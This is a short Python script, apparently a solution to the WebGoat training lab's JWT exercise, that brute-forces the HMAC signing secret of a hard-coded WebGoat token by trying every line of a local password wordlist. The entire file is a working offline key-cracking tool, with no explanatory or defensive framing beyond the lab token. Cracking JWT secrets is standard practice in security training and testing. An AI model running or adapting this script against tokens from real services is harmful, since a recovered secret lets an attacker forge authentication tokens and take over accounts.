import jwt
import termcolor
if __name__ == "__main__":
    jwt_str = R'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU4MDYxNTg3NywiZXhwIjoxNTgwNjE1OTM3LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.eohzwETD1VzctCXQ3A8ESPzAoZ7u5DDCw04M79wgefc'
    with open('D:\pycharm\pass.txt') as f:
        for line in f:
            key_ = line.strip()
            try:
                jwt.decode(jwt_str, verify=True, key=key_)
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except jwt.exceptions.InvalidSignatureError:
                print('\r', ' ' * 64, '\r\btry', key_, end='', flush=True)
                continue
        else:
            print('\r', '\bsorry! no key be found.')